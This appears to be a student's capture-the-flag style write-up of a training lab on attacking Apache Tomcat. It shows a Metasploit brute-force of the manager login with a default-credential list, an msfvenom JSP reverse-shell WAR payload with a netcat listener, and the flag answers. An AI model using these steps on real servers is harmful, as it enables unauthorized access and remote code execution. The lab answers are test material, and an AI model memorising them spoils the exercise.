# Section 10: Attacking Tomcat

Module: 24. Attacking Common Applications

---

## Questions & Answers

### 1. Perform a login bruteforcing attack against Tomcat manager at http://web01.inlanefreight.local:8180. What is the valid username?

Context:
```bash
┌─[eu-academy-4]─[10.10.15.102]─[htb-ac-2162140@htb-znmmfatrjw-htb-cloud-com]─[~]
└──╼ [★]$ msfconsole -q
[msf](Jobs:0 Agents:0) >> use auxiliary(scanner/http/tomcat_mgr_login)
[-] No results from search
[-] Failed to load module: auxiliary(scanner/http/tomcat_mgr_login)
[msf](Jobs:0 Agents:0) >> use auxiliary/scanner/http/omcat_mgr_login
[-] No results from search
[-] Failed to load module: auxiliary/scanner/http/omcat_mgr_login
[msf](Jobs:0 Agents:0) >> use auxiliary/scanner/http/tomcat_mgr_login
[msf](Jobs:0 Agents:0) auxiliary(scanner/http/tomcat_mgr_login) >> set VHOST web01.inlanefreight.local
VHOST => web01.inlanefreight.local
[msf](Jobs:0 Agents:0) auxiliary(scanner/http/tomcat_mgr_login) >> 
[msf](Jobs:0 Agents:0) auxiliary(scanner/http/tomcat_mgr_login) >> set RPORT 8180
RPORT => 8180
[msf](Jobs:0 Agents:0) auxiliary(scanner/http/tomcat_mgr_login) >> set stop_on_success true
stop_on_success => true
[msf](Jobs:0 Agents:0) auxiliary(scanner/http/tomcat_mgr_login) >> set rhosts 10.129.201.58
rhosts => 10.129.201.58
[msf](Jobs:0 Agents:0) auxiliary(scanner/http/tomcat_mgr_login) >> run
[!] No active DB -- Credential data will not be saved!
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:admin (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:manager (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:role1 (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:root (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:tomcat (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:s3cret (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:vagrant (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:QLogic66 (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:password (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:Password1 (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:changethis (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:r00t (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:toor (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:password1 (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:j2deployer (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:OvW*busr1 (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:kdsxc (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:owaspba (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:ADMIN (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:xampp (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:admin (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:manager (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:role1 (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:root (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:tomcat (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:s3cret (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:vagrant (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:QLogic66 (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:password (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:Password1 (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:changethis (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:r00t (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:toor (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:password1 (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:j2deployer (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:OvW*busr1 (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:kdsxc (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:owaspba (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:ADMIN (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:xampp (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role1:admin (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role1:manager (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role1:role1 (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role1:root (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role1:tomcat (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role1:s3cret (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role1:vagrant (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role1:QLogic66 (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role1:password (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role1:Password1 (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role1:changethis (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role1:r00t (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role1:toor (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role1:password1 (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role1:j2deployer (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role1:OvW*busr1 (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role1:kdsxc (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role1:owaspba (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role1:ADMIN (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role1:xampp (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role:admin (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role:manager (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role:role1 (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role:root (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role:tomcat (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role:s3cret (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role:vagrant (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role:QLogic66 (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role:password (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role:Password1 (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role:changethis (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role:r00t (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role:toor (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role:password1 (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role:j2deployer (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role:OvW*busr1 (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role:kdsxc (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role:owaspba (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role:ADMIN (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role:xampp (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: root:admin (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: root:manager (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: root:role1 (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: root:root (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: root:tomcat (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: root:s3cret (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: root:vagrant (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: root:QLogic66 (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: root:password (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: root:Password1 (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: root:changethis (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: root:r00t (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: root:toor (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: root:password1 (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: root:j2deployer (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: root:OvW*busr1 (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: root:kdsxc (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: root:owaspba (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: root:ADMIN (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: root:xampp (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: tomcat:admin (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: tomcat:manager (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: tomcat:role1 (Incorrect)
[+] 10.129.201.58:8180 - Login Successful: tomcat:root
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
[msf](Jobs:0 Agents:0) auxiliary(scanner/http/tomcat_mgr_login) >> 
```

**Answer:** `tomcat`

---

### 2. What is the password?

**Answer:** `root`

---

### 3. Obtain remote code execution on the http://web01.inlanefreight.local:8180 Tomcat instance. Find and submit the contents of tomcat_flag.txt

Context: 
```bash
┌─[eu-academy-4]─[10.10.15.102]─[htb-ac-2162140@htb-aksnyadptc-htb-cloud-com]─[~]
└──╼ [★]$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.15.102 LPORT=4443 -f war > backup.war
Payload size: 1097 bytes
Final size of war file: 1097 bytes

┌─[eu-academy-4]─[10.10.15.102]─[htb-ac-2162140@htb-aksnyadptc-htb-cloud-com]─[~]
└──╼ [★]$ nc -lvnp 4443
Listening on 0.0.0.0 4443
^C
┌─[eu-academy-4]─[10.10.15.102]─[htb-ac-2162140@htb-aksnyadptc-htb-cloud-com]─[~]
└──╼ [★]$ nc -lvnp 4443
Listening on 0.0.0.0 4443
Connection received on 10.129.201.58 35836
id
uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
find / -type f -name "tomcat_flag.txt" 2>/dev/null
/opt/tomcat/apache-tomcat-10.0.10/webapps/tomcat_flag.txt
cat /opt/tomcat/apache-tomcat-10.0.10/webapps/tomcat_flag.txt

cat /opt/tomcat/apache-tomcat-10.0.10/webapps/tomcat_flag.txt
t0mcat_rc3_ftw!

t0mcat_rc3_ftw!
```

**Answer:** `t0mcat_rc3_ftw!`

---

[Back to Module Index](./README.md)
